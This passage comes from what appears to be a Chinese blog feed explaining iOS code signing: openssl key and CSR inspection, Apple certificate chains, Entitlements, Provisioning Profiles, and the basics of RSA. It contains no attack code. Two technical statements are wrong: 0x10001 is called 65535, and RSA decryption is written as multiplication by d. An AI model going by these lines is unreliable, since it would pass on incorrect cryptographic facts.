<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl pkcs12 -in JustForTesting.p12 -out private_key.pem  <span class="c"># 导出p12文件中的密钥</span>
</span><span class='line'>Enter Import Password:    <span class="c"># 输入p12文件的密码</span>
</span><span class='line'>MAC verified OK
</span><span class='line'>Enter PEM pass phrase:    <span class="c"># 设定导出的密钥文件的密码</span>
</span><span class='line'>Verifying - Enter PEM pass phrase:    <span class="c"># 确认密码</span>
</span><span class='line'><span class="nv">$ </span>openssl rsa -in private_key.pem -noout -text  <span class="c"># 查看密钥文件的内容</span>
</span><span class='line'>Enter pass phrase <span class="k">for </span>private_key.pem:   <span class="c"># 输入密钥文件的密码</span>
</span><span class='line'>Private-Key: <span class="o">(</span>2048 bit<span class="o">)</span>
</span><span class='line'>modulus:
</span><span class='line'>    00:c2:98:f5:02:eb:dc:a6:fd:4b:12:4c:70:17:a6:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>publicExponent: 65537 <span class="o">(</span>0x10001<span class="o">)</span>
</span><span class='line'>privateExponent:
</span><span class='line'>    00:a1:67:68:e1:51:6c:a4:fd:36:45:29:2d:58:10:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>prime1:
</span><span class='line'>    00:f3:91:5d:5b:dc:c1:de:d2:ab:7a:5f:b2:27:41:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>prime2:
</span><span class='line'>    00:cc:87:b5:c9:7e:81:39:94:13:c1:ff:3f:d7:7b:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>exponent1:
</span><span class='line'>    00:a5:a0:22:c0:f5:d3:eb:86:8c:4e:b1:c6:3e:85:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>exponent2:
</span><span class='line'>    00:8b:e1:00:85:a6:7c:10:79:e2:2d:5a:39:3a:51:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>coefficient:
</span><span class='line'>    7e:30:60:84:fc:47:6b:90:fe:e7:32:1a:2f:b0:c4:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span></code></pre></td></tr></table></div></figure>


<p>这里出现了几个熟悉的面孔：</p>

<ul>
<li>prime1/prime2 就是生成密钥所使用的两个超大的素数<code>p, q</code></li>
<li>modulus 是这两个超大素数的乘积 <code>n = p * q</code></li>
<li>publicExponent 是公钥因子，也就是前文中的<code>e</code>, 这里固定为 0x10001 (65535)</li>
<li>privateExponent 是私钥因子，即前文中的<code>d</code></li>
</ul>


<p>CSR文件的内容其实就是个人信息、公钥(Modulus + PublicExponent)，以及自签名(使用自己的私钥进行签名)， 可通过openssl命令查看其内容：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl req -in ~/Desktop/CertificateSigningRequest.certSigningRequest -text -noout
</span><span class='line'>Certificate Request:
</span><span class='line'>    Data:
</span><span class='line'>        Version: 0 <span class="o">(</span>0x0<span class="o">)</span>
</span><span class='line'>        Subject: <span class="nv">emailAddress</span><span class="o">=</span>me@xelz.info, <span class="nv">CN</span><span class="o">=</span>JustForTesting, <span class="nv">C</span><span class="o">=</span>CN
</span><span class='line'>        Subject Public Key Info:
</span><span class='line'>            Public Key Algorithm: rsaEncryption
</span><span class='line'>                Public-Key: <span class="o">(</span>2048 bit<span class="o">)</span>
</span><span class='line'>                Modulus:
</span><span class='line'>                    00:c2:98:f5:02:eb:dc:a6:fd:4b:12:4c:70:17:a6:
</span><span class='line'>                    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>                Exponent: 65537 <span class="o">(</span>0x10001<span class="o">)</span>
</span><span class='line'>        Attributes:
</span><span class='line'>            a0:00
</span><span class='line'>    Signature Algorithm: sha256WithRSAEncryption
</span><span class='line'>         b7:11:aa:48:2f:b3:10:e9:71:c7:93:c3:ec:44:8d:0f:a0:5a:
</span><span class='line'>         xx:xx:xx:xx:xx:xx:xx:...
</span></code></pre></td></tr></table></div></figure>


<h4>提交给Apple进行签名</h4>

<p>在苹果开发者网站，将CSR提交给Apple进行签名，Apple会返回一个签好名的<code>证书文件</code>，后缀名为<code>cer</code>。</p>

<p>先查看一下他的<code>sha1</code>值，后面会用到</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>shasum ios_development.cer
</span><span class='line'>11447116f2c5521b057b9b67290f0fdadeadfa0a  ios_development.cer
</span></code></pre></td></tr></table></div></figure>


<p>双击即可将其导入到Keychain中，Keychain会自动把它之前创建CSR时自动生成的密钥归为一组。无论是在证书列表中查看还是在密钥列表中查看，都能看到与之匹配的<code>另一半</code>。</p>

<p><img src="http://xelz.info/assets/2019/csr5.png" alt="" /></p>

<p>查看证书的内容</p>

<p><img src="http://xelz.info/assets/2019/cert1.png" alt="" /></p>

<p>可以从证书中得到几个关键信息：</p>

<ol>
<li>证书的所有者，这部分信息并非由我们自行指定，而是签发者Apple根据我们的账号信息自动生成</li>
<li>证书的签发者，即前文所述的<code>CA</code></li>
<li>证书的公钥信息，与之前生成的密钥文件及CSR完全一致</li>
</ol>


<p>现在应该可以理解证书和密钥的关系了，密钥中保存了私钥和公钥，私钥用于签名，而证书里面有且只有公钥，并且是被第三方<code>CA</code> &ldquo;认证&rdquo; 过，用于解密和校验。</p>

<p>图中可以看到这个证书的签发者是<code>Apple Worldwide Developer Relations Certification Authority</code>，在Keychain中搜索这个名字， 可以看到它的证书详情。我们会发现，它的类型是<code>中级证书颁发机构(中级CA)</code>，它也包含签名，并且是由另外一个叫做<code>Apple Root CA</code>的<code>根证书颁发机构(根CA)</code>进行签发的，这样就形成了一条证书链。而继续查看<code>Apple Root CA</code>的证书，会发现它是自签名的，因为它会被内置在设备中，设备无条件信任它，也就不需要其他的机构为其背书了。</p>

<p><img src="http://xelz.info/assets/2019/cert2.png" alt="" /></p>

<p>这样的证书链机制可以简化根证书颁发机构的工作，同时提升证书管理的安全性。将颁发底层证书的工作分散给多个中级证书颁发机构进行处理，根证书颁发机构只需要对下一级机构的证书进行管理和签发，降低根证书颁发机构私钥的使用频率，也就降低了私钥泄露的风险。中级证书颁发机构各司其职，即使出现私钥泄露这样的重大安全事故，也不至于波及整个证书网络。</p>

<h4>开发证书与发布证书</h4>

<p>开发者证书按用途可分为Development证书和Distribution证书：</p>

<ul>
<li>Development证书是用于开发及测试阶段使用的证书，它用于在设备安装上开发阶段的App后对App的完整性进行校验，一般证书名称为 iPhone Developer: xxxxxxx。如果是多人协作的开发者账号，任意成员都可以申请自己的Development证书。</li>
<li>Distribution证书是用于提交AppStore的证书，一般命名为 iPhone Distribution: xxxxxxxxx，用于让AppStore校验提交上来的App的完整性，只有管理员以上身份的开发者账号才可以申请，因此可以控制提交权限的范围。同时，Distribution证书不能用于开发及调试。</li>
</ul>


<h4>企业级开发者证书</h4>

<p>除了普通开发者证书(个人开发者账号和公司开发者账号使用的证书)外，还有一种特殊的<code>企业级开发者证书</code>，这种证书签名的App可以被直接安装在任意的iOS设备上，只要用户主动信任该证书即可。它的作用是方便企业给内部员工分发生产力工具，比如往往存在这样一些场景：企业内部无法访问互联网，自然也就无法通过AppStore安装应用，或是使用私有API，完成一些AppStore不允许的功能。前面所说的不需要苹果签名即可安装运行的机制同样适用于企业级开发者证书，并且是企业级开发者证书的基础。</p>

<p>从证书的申请方式和内容来看，企业级开发者证书和普通开发者证书并无不同，只是开发者账号的申请方式和费用有区别。此外，Apple对这两种证书所能提供的Provisioning Profile有细微的差异，下一节马上就会分析。</p>

<h2>0x04 Entitlements &amp; Provisioning Profile</h2>

<p>除了开发者证书，在进行iOS代码签名的时候还需要有这两个文件，他们是被签名内容的一部分</p>

<h4>Entitlements</h4>

<p>沙盒(Sandbox)技术是iOS安全体系中非常重要的一项技术，他的目的是通过各种技术手段限制App的行为，比如可读写的路径，允许访问的硬件，允许使用的服务等等，即使应用出现任意代码执行的漏洞，也无法影响到沙盒外的系统。（图来自<a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html">Apple开发者网站</a>）</p>

<p><img src="http://xelz.info/assets/2019/sandboxing.png" alt="" /></p>

<p>通常所说的Entitlements(授权文件)，也就是指iOS沙盒的配置文件，这个文件中声明了app所需的权限，如果app中使用到了某项沙盒限制的功能，但没有声明对应的权限，可能运行到相关的代码时会直接Crash。</p>

<p>全新的iOS工程中是没有这个文件的，如果在<code>Capabilities</code>中开启了一些需要权限的功能之后，Xcode会自动(Xcode 8及之后的版本)生成Entilements文件，并将对应的权限声明添加到Entitlements文件中。</p>

<p><img src="http://xelz.info/assets/2019/ent1.png" alt="" /></p>

<p><img src="http://xelz.info/assets/2019/ent2.png" alt="" /></p>

<p>这个文件其实是xml格式的<code>plist</code>文件，内容如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>inter-app-audio<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;true/&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>实际上，这个文件的内容并非是全部的授权内容，因为缺省状态下，App默认会包含以下与Team ID及App ID相关的权限声明：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>keychain-access-groups<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;array&gt;</span>
</span><span class='line'>        <span class="nt">&lt;string&gt;</span>xxxxxxxxxx.*<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>get-task-allow<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>application-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;string&gt;</span>xxxxxxxxxx.test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>com.apple.developer.team-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;string&gt;</span>xxxxxxxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>其中<code>get-task-allow</code>代表是否允许被调试，它在开发阶段是必需的一项权限，而在进行Archive打包用于上架时会被去除。</p>

<p>进行代码签名时，会将这个Entitlements文件(如有)与上述缺省内容进行合并，得到最终的授权文件，并嵌入二进制代码中，作为被签名内容的一部分，由代码签名保证其不可篡改性。</p>

<h4>Provisioning Profile</h4>

<p>Xcode对Provisioning Profile的解释是</p>

<blockquote><p> A provisioning profile is a collection of digital entities that uniquely ties developers and devices to an authorized iPhone Development Team and enables a device to be used for testing.</p></blockquote>

<p>Provisioning Profile在这里就起到了一个对设备和开发者授权的作用，他将开发者账号、证书、entitlements文件以及设备进行了绑定。</p>

<p>同样地，在开发过程中，Xcode 8及后续版本默认情况下会自动帮我们管理Provisioining Profile，自动下载的Provisioning Profile都被存放在<code>~/Library/MobileDevice/Provisioning\ Profiles/</code>路径下，以<code>UUID</code>格式命名。直接拖拽下图中的齿轮图标到Finder中也可以将其复制出来。</p>

<p><img src="http://xelz.info/assets/2019/provision1.png" alt="" /></p>

<p>由于这个文件是被苹果签过名的，所以我们没有办法伪造或者修改这个文件，它使用的是标准的CMS(Cryptographic Message Syntax)格式，可以通过security命令查看它的签名信息，并将文件的内容提取出来：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>security cms -D -i xxxxxxxxxxx.mobileprovision -h 1 -n  <span class="c"># 查看签名信息</span>
</span><span class='line'>SMIME:    <span class="nv">level</span><span class="o">=</span>1.2<span class="p">;</span> <span class="nb">type</span><span class="o">=</span>signedData<span class="p">;</span> <span class="nv">nsigners</span><span class="o">=</span>1<span class="p">;</span>
</span><span class='line'>      signer0.id<span class="o">=</span><span class="s2">&quot;Apple iPhone OS Provisioning Profile Signing&quot;</span><span class="p">;</span> signer0.status<span class="o">=</span>GoodSignature<span class="p">;</span>
</span><span class='line'>  <span class="nv">level</span><span class="o">=</span>1.1<span class="p">;</span> <span class="nb">type</span><span class="o">=</span>data<span class="p">;</span>
</span><span class='line'><span class="nv">$ </span>security cms -D -i ea8585cd-c2da-4b08-81c2-e32b28c34871.mobileprovision -o provision.plist  <span class="c"># 将内容导出</span>
</span></code></pre></td></tr></table></div></figure>


<p>Provisioning Profile统一都是由<code>Apple iPhone OS Provisioning Profile Signing</code>进行签名的，机构名称言简意赅。导出的provision.plist内容如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>AppIDName<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>TestCodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    ...
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>DeveloperCertificates<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;array&gt;</span>
</span><span class='line'>      <span class="nt">&lt;data&gt;</span>xxxxx<span class="nt">&lt;/data&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data&gt;</span>xxxxx<span class="nt">&lt;/data&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data&gt;</span>xxxxx<span class="nt">&lt;/data&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>Entitlements<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>keychain-access-groups<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;array&gt;</span>
</span><span class='line'>          <span class="nt">&lt;string&gt;</span>xxxxx.*<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>inter-app-audio<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>get-task-allow<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>application-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx.test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>com.apple.developer.team-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>com.apple.developer.siri<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>ExpirationDate<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;date&gt;</span>2020-01-22T05:14:57Z<span class="nt">&lt;/date&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>iOS Team Provisioning Profile: test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>ProvisionedDevices<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;array&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>  ...
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>很明显可以看出这是一个xml格式的plist文件，里面的内容不难理解，最关键的是这几项</p>

<ul>
<li><strong>DeveloperCertificates</strong>：允许使用的开发者证书，这是一个列表，一般包含生成这个Provisioning Profile文件时，当前开发者账号下所有有效的Development证书，以base64格式保存，使用base64解码之后就可以得到DER格式的开发者证书。通过计算每个证书的sha1值，可以看出，前文中新申请的证书，就在这个列表中</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="k">for </span>i in <span class="sb">`</span>seq 3<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> /usr/libexec/PlistBuddy -x -c <span class="s1">&#39;Print:DeveloperCertificates:&#39;</span><span class="nv">$i</span> provision.plist <span class="p">|</span> sed -n <span class="s1">&#39;/&lt;data&gt;/,/&lt;\/data&gt;/p&#39;</span> <span class="p">|</span> sed -e <span class="s1">&#39;1d;$d&#39;</span> <span class="p">|</span> base64 -D <span class="p">|</span> shasum <span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="k">  </span>11447116f2c5521b057b9b67290f0fdadeadfa0a  -    <span class="c"># &lt;--- 新申请的证书</span>
</span><span class='line'>  df446e4fad5aa292c7323da4cf7b8869fa5c89e7  -
</span><span class='line'>  9d31f7e8c27760ffa061598ba90ea614948224bf  -
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>Entitlements</strong>：允许使用的权限列表，实际在App中使用的权限必须是这个列表的子集，否则安装时会无法通过校验而失败。如果曾经开启过某个功能，Xcode自动更新了Provisioning Profile，后来又关闭它，Xcode并不会将其从Provisioning Profile中删去，如示例中的<code>com.apple.developer.siri</code>。</li>
<li><strong>ProvisionedDevices</strong>：允许安装的设备列表，如果目标设备的UUID不在这个列表中，会安装失败。对于这一项，普通开发者证书和企业级开发者证书的待遇是不同的。普通开发者证书使用Provisioning Profile的方式安装App到设备，只是出于测试和调试的需要，因此Apple只允许最多注册100台用于测试的设备，否则开发者就可以以测试的名义任意任意分发自己的App了。而对于企业级开发者来说，本身就有任意安装的需求，因此在分发时，这一项会被<code>ProvisionsAllDevices</code>取代，代表授权任意设备。</li>
</ul>


<p>这些信息中有任何变动的时候，比如开发者证书有新增或者失效，在Capabilities中启用了当前App从未使用过的新功能，或是将新的iPhone连接到Xcode用于测试，Xcode都会自动重新申请Provisioning Profile。</p>

<p>Provisioning Profile会被内置在App中，置于App根目录下的<code>embedded.mobileprovision</code>。安装App时如果签名校验通过，这个文件会自动被拷贝到iOS设备的<code>/Library/MobileDevice/Provisioning\ Profiles/</code>路径下。由于该文件已被Apple官方签名，系统可以无条件信任它，并用它来校验App的签名、权限，以及本机的UUID等是否满足来自官方的授权。通过这种方式，间接信任了使用开发者证书签名的App，让iOS设备可以运行非苹果官方签名的App。</p>

<p>假如你有一台越狱的设备，查看任意一个从AppStore上下载下来的App，里面都不会有embedded.mobileprovision这个文件，因为经过Apple重新签名以后，设备就不再需要它了。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[细说iOS代码签名(一)]]></title>
    <link href="http://xelz.info/blog/2019/01/11/ios-code-signature-1/"/>
    <updated>2019-01-11T11:12:14+08:00</updated>
    <id>http://xelz.info/blog/2019/01/11/ios-code-signature-1</id>
    <content type="html"><![CDATA[<h4>导航</h4>

<ul>
<li>一口气读完，大约需要40-60分钟

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature/">深度长文：细说iOS代码签名</a></li>
</ul>
</li>
<li>分步阅读

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-1/">细说iOS代码签名(一)</a>：签名的作用及原理</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-2/">细说iOS代码签名(二)</a>：开发者证书、Entitlements、Provisioning Profile</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-3/">细说iOS代码签名(三)</a>：签名的过程及代码签名的数据结构</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-4/">细说iOS代码签名(四)</a>：签名校验、越狱、重签名</li>
</ul>
</li>
</ul>


<h2>0x01 签名的作用</h2>

<p>数字签名其实跟我们手写的签名类似，代表一个特定的主体(签名者)对特定内容(被签名数据)的署名和认可，签名是对信息发送行为真实性的有效保障。数字签名在很多领域都有应用，iOS的代码签名正是其中最典型的一种，我们可以先尝试分析一下iOS上代码签名的目的和好处。</p>

<!-- more -->


<h4>安全性</h4>

<p>代码签名的首要任务是保证设备及系统的安全性，只有被苹果设备认可的证书签名的代码才能够被执行，否则在安装或者运行时会因为无法通过内核的签名校验而失败。iOS的系统中内置了来自苹果的CA证书，系统自身的代码都是被苹果”签名“过的， 而用户从AppStore下载的App也都已被苹果官方进行签名。签名机制可以有效地防止来自外部的攻击。</p>

<p>这里存在两种场景：</p>

<ul>
<li>第一种是对系统本身的攻击，比如越狱，假如黑客发现了内核任意读写的漏洞，借此注入提权代码，但是这些代码会因为没有合法的签名而被系统拒绝运行，也就自然无法对系统造成实质性的破坏。</li>
<li>第二种是对设备或者用户的攻击，众所周知，提交到AppStore的应用代码都会经过苹果的审查，包含恶意代码的App是无法上架的。此时，黑客可能会尝试先提交一个正常的App，通过各种技术手段躲避Apple的审查，上架后从网络上下载恶意代码并加载执行，但这种方式也会因为签名不合法而失败。</li>
</ul>


<h4>沙盒</h4>

<p>除了能够避免非授权的恶意代码运行，代码签名还可以有效地限制app的行为，这部分功能主要是由Sandbox机制来保证，但Sandbox的配置是绑定在签名中的，就是通常所说的Entitlements文件。试想，如果Entitlements文件可以被任意修改，那么Sandbox也就失去了意义，所以Entitlements文件也是强制签名保护的对象。对于越狱来说，如果无法绕过签名和Sandbox，再强大的提权漏洞也无计可施。</p>

<h4>垄断</h4>

<p>代码签名还给苹果带来了一个巨大的好处：App分发的绝对控制权。在iOS平台上(面向未越狱的用户)公开发行App的合法途径有且只有一种，就是上传到苹果官方的AppStore供用户下载。苹果会对App进行严格的审查并签名，App的功能及支付渠道也因此可以受苹果的严格管制，这为苹果带来的经济效益不言而喻。</p>

<h2>0x02 什么是签名</h2>

<p>签名的本质是用于验证数据的合法性，确保被签名的数据来自特定的来源，并且未经篡改。它基于非对称加密，和哈希算法，研究签名之前需要对这两种算法有一定的了解。</p>

<h4>公钥加密算法</h4>

<p>也叫非对称加密，它在加密和解密时使用的是不同的密钥，具有这样的特征：</p>

<ul>
<li>有一对密钥 <code>a</code> 和  <code>b</code> ，满足 <code>a ≠ b</code></li>
<li>用密钥<code>a</code>加密的数据只能用<code>b</code>进行解密，<code>a</code>自身无法解密，反之亦然</li>
<li>只知道其中一个密钥，无法推导出另一个</li>
<li>把其中一个可以公开的叫做公钥，另一个不能公开的叫做私钥。</li>
</ul>


<p><img src="http://xelz.info/assets/2019/pubkey_crypto.png" alt="公钥加密算法" /></p>

<p>最常见的公钥加密算法是RSA公钥加密算法，也是签名中普遍使用的算法。其数学原理如下：</p>

<ul>
<li>选定两个超大的素数<code>p</code>, <code>q</code>，并计算他们的乘积<code>n = p * q</code></li>
<li>计算欧拉函数 <code>φ(n) = φ(p) * φ(q) = (p-1) * (q-1)</code></li>
<li>随机选定一个数<code>e</code>，满足<code>1 &lt; e &lt; φ(n)</code> ，且与<code>φ(n)</code>互质</li>
<li>根据扩展欧几里得算法计算<code>e</code>对于<code>φ(n)</code>的乘法逆元<code>d</code> ，<code>e * d = 1 mod φ(n)</code></li>
<li><code>{n, e}</code> 和 <code>{n, d}</code> 分别组成这个算法的一对密钥</li>
<li>对于给定明文<code>p</code>,  若使用<code>{n, e}</code> 作为加密密钥，其密文计算方法为 <code>c = p ^ e mod n</code>

<ul>
<li>这是一个<code>单向函数</code>，已知<code>{c, n, e}</code> 无法计算出<code>p</code></li>
</ul>
</li>
<li>相应地需要使用<code>{n, d}</code>进行解密， <code>p' = c * d mod n</code>

<ul>
<li>这是上一步加密函数的<code>逆函数</code></li>
</ul>
</li>
<li>两组密钥中<code>n</code>是相同的，那么如果已知了<code>e</code>和<code>d</code>其中的一个，想要计算另一个，必须知道<code>φ(n)</code>，也就是必须先将<code>n</code>分解<code>质因数</code>，得到<code>p</code>和<code>q</code>，但由于<code>n</code>的值非常大，这样的计算量基本上是<code>不可能</code>的，也就保障了算法的安全性</li>
</ul>


